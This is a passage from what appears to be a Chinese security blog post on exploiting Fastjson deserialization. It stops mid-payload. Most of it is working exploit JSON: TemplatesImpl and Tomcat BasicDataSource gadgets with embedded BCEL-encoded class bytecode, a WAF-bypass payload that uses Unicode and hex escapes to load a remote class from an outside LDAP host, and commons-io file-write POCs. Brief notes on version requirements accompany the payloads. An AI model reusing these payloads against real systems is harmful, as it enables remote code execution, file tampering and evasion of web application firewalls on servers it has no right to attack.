+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+    <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;val&#34;</span><span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>
+        <span class="p">},</span>
+    <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;_bytecodes&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;poc_base64&#34;</span><span class="p">],</span>
+        <span class="err">&#39;_name&#39;:</span> <span class="err">&#39;a.b&#39;,</span>
+        <span class="err">&#39;_tfactory&#39;:</span> <span class="err">{</span><span class="p">},</span>
+        <span class="nt">&#34;_outputProperties&#34;</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="nt">&#34;_name&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;_version&#34;</span><span class="p">:</span> <span class="s2">&#34;1.0&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;allowedProtocols&#34;</span><span class="p">:</span> <span class="s2">&#34;all&#34;</span>
+      <span class="p">}</span>
+<span class="err">}</span>
+
+
+<span class="p">{</span>
+    <span class="err">{</span>
+        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.alibaba.fastjson.JSONObject&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;x&#34;</span><span class="p">:{</span>
+                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;</span><span class="p">,</span>
+                <span class="nt">&#34;driverClassLoader&#34;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span>
+                <span class="p">},</span>
+                <span class="nt">&#34;driverClassName&#34;</span><span class="p">:</span> <span class="s2">&#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&#34;</span>
+        <span class="p">}</span>
+    <span class="p">}</span><span class="err">:</span> <span class="s2">&#34;x&#34;</span>
+<span class="err">}</span>
+
+
+<span class="p">{</span>
+    <span class="nt">&#34;xx&#34;</span><span class="p">:</span>
+    <span class="p">{</span>
+        <span class="nt">&#34;@type&#34;</span> <span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;val&#34;</span>   <span class="p">:</span> <span class="s2">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;</span>
+    <span class="p">},</span>
+    <span class="nt">&#34;x&#34;</span> <span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="p">{</span>
+            <span class="nt">&#34;@type&#34;</span> <span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span>
+            <span class="nt">&#34;val&#34;</span>   <span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span>
+        <span class="p">},</span>
+        <span class="err">{</span>
+            <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.alibaba.fastjson.JSONObject&#34;</span><span class="p">,</span>
+            <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;</span><span class="p">,</span>
+                <span class="nt">&#34;driverClassLoader&#34;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="nt">&#34;@type&#34;</span> <span class="p">:</span> <span class="s2">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span>
+                <span class="p">},</span>
+                <span class="nt">&#34;driverClassName&#34;</span><span class="p">:</span><span class="s2">&#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&#34;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="p">:</span> <span class="s2">&#34;xxx&#34;</span>
+    <span class="p">}</span>
+<span class="err">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>限制：</p>
+<p>第一个需要开启<code>Feature.SupportNonPublicField</code>，实战很难遇到。</p>
+<p>第二个依赖于<code>tomcat（tomcat6、7：dbcp ； tomcat8：dbcp2）</code>且jdk版本≤8u251；</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png"
+        data-srcset="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png, https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png 1.5x, https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png"
+        title="image.png" /></p>
+<h2 id="绕waf">绕waf</h2>
+<p>不同与传统json标准，在fastjson中16进制是可以被解析的。它还支持在json语句中加入注释，单引号替换双引号，默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等等等。</p>
+<p>如今市面上大部分waf只针对@type 和<code>com.sun.rowset.JdbcRowSetImpl</code> 进行检测，所以我们通过结合Unicode和16进制编码即可轻松绕过waf。</p>
+<p><strong>以OPPO云和阿里云waf为例</strong></p>
+<p><code>{&quot;name&quot;:{&quot;@\u0074\u0079\u0070\u0065&quot;:/*asdasd*/\r\n&quot;java.l\x61ng.Cl\x61ss&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRo\x77\x53etImpl&quot;},&quot;x&quot;:{&quot;@\u0074\u0079\u0070\u0065&quot;:&quot;com.sun.rowset.Jd\x62\x63RowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://11.11.11.11:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png"
+        data-srcset="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png, https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png 1.5x, https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png"
+        data-srcset="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png, https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png 1.5x, https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png"
+        data-srcset="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png, https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png 1.5x, https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png"
+        data-srcset="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png, https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png 1.5x, https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png"
+        title="image.png" /></p>
+<h2 id="fastjson1268利用">fastjson1.2.68利用</h2>
+<p>和1.2.47版本的漏洞一样，68版本也是对checkAutoType()的的绕过，无需考虑fastjson的黑名单进行利用。</p>
+<h3 id="任意文件写入">任意文件写入</h3>
+<p>参考：<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p>
+<p>依赖于commons-io 2.0 - 2.6 的POC：</p>
+<p><code>{  &quot;x&quot;:{    &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,    &quot;input&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,        &quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;      },      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;:1024    },    &quot;branch&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,      &quot;writer&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,        &quot;file&quot;:&quot;/tmp/pwned&quot;,        &quot;encoding&quot;:&quot;UTF-8&quot;,        &quot;append&quot;: false      },      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024,      &quot;writeImmediately&quot;: true    },    &quot;trigger&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    },    &quot;trigger2&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    },    &quot;trigger3&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:{          &quot;$ref&quot;:&quot;$.input&quot;        },        &quot;branch&quot;:{          &quot;$ref&quot;:&quot;$.branch&quot;        },        &quot;closeBranch&quot;: true      },      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    }  }}</code></p>
+<p>依赖于commons-io 2.7 - 2.8.0 的POC：</p>
+<p><code>{  &quot;x&quot;:{    &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,    &quot;input&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,        &quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;,        &quot;start&quot;:0,        &quot;end&quot;:2147483647      },      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;:1024    },    &quot;branch&quot;:{      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,      &quot;writer&quot;:{        &quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,        &quot;file&quot;:&quot;/tmp/pwned&quot;,        &quot;charsetName&quot;:&quot;UTF-8&quot;,        &quot;append&quot;: false      },      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024,      &quot;writeImmediately&quot;: true 